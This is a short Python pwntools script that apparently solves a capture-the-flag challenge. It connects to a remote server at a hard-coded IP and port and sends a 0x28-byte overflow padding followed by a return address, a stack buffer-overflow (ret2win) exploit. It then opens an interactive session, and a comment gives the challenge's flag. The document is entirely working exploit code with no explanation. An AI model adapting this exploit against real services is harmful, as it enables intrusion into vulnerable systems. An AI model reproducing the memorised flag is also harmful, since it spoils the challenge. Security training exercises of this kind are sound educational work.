from pwn import *

r = remote('140.110.112.218', 6126)

r.recvuntil("?")
r.sendline(b'a'*0x28 + p64(0x004006c6)) # MyFirstCTF{r3tURn_t0_3h3rev3R_U_w4nT_tO_g0_XD}
r.interactive()